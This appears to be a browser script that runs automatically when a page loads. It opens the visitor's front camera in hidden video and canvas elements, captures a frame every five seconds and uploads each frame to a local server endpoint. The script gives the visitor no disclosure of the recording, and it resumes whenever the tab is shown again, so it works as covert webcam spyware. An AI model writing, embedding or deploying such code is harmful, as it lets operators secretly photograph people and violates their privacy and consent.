// Global variables to control monitoring state
let isMonitoring = false;
let lastCaptureTime = 0;
const CAPTURE_INTERVAL = 5000; // 5 seconds in milliseconds

// Create camera and monitoring elements
const setupMonitoring = () => {
    const video = document.createElement('video');
    video.style.display = 'none';
    video.setAttribute('playsinline', '');
    video.setAttribute('autoplay', '');
    document.body.appendChild(video);

    const canvas = document.createElement('canvas');
    canvas.style.display = 'none';
    document.body.appendChild(canvas);
    
    return { video, canvas };
};

// Initialize camera
const initializeCamera = async (video) => {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { 
                width: 320,
                height: 240,
                facingMode: 'user'
            }, 
            audio: false 
        });
        video.srcObject = stream;
        
        return new Promise((resolve) => {
            video.onloadedmetadata = () => {
                video.play().then(() => resolve(true));
            };
        });
    } catch (err) {
        console.error('Error accessing camera:', err);
        return false;
    }
};

// Upload function
const uploadImage = (imageData) => {
    const xhr = new XMLHttpRequest();
    xhr.open('POST', 'http://localhost:3000/upload', true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    
    // Send the request asynchronously
    xhr.send(JSON.stringify({ image: imageData }));
    
    // We don't wait for the response to avoid any blocking
    xhr.onerror = () => {
        console.error('Upload failed');
    };
};

// Capture and upload function
const captureAndUpload = (video, canvas) => {
    const currentTime = Date.now();
    
    // Check if enough time has passed since last capture
    if (currentTime - lastCaptureTime < CAPTURE_INTERVAL) {
        return;
    }
    
    try {
        // Set canvas dimensions
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        
        // Draw video frame to canvas
        const context = canvas.getContext('2d');
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        // Convert canvas to base64 image with reduced quality
        const imageData = canvas.toDataURL('image/jpeg', 0.5);
        
        // Upload image
        uploadImage(imageData);
        
        // Update last capture time
        lastCaptureTime = currentTime;
    } catch (error) {
        console.error('Capture failed:', error);
    }
};

// Main monitoring function
const startMonitoring = async () => {
    if (isMonitoring) return;
    
    const { video, canvas } = setupMonitoring();
    
    try {
        const cameraInitialized = await initializeCamera(video);
        if (!cameraInitialized) {
            console.error('Failed to initialize camera');
            return;
        }
        
        isMonitoring = true;
        
        // Use requestAnimationFrame for smoother operation
        const monitoringLoop = () => {
            if (!isMonitoring) return;
            
            captureAndUpload(video, canvas);
            requestAnimationFrame(monitoringLoop);
        };
        
        // Start the monitoring loop
        monitoringLoop();
        
    } catch (error) {
        console.error('Error starting monitoring:', error);
        isMonitoring = false;
    }
};

// Stop monitoring function
const stopMonitoring = () => {
    isMonitoring = false;
};

// Initialize monitoring
const initMonitoring = () => {
    // Start after a short delay to ensure page is fully loaded
    setTimeout(() => {
        startMonitoring().catch(err => {
            console.error('Failed to start monitoring:', err);
        });
    }, 1000);
};

// Start monitoring when the page loads
document.addEventListener('DOMContentLoaded', initMonitoring);

// Cleanup when the page is unloaded
window.addEventListener('beforeunload', stopMonitoring);

// Handle visibility changes
document.addEventListener('visibilitychange', () => {
    if (document.hidden) {
        stopMonitoring();
    } else {
        initMonitoring();
    }
});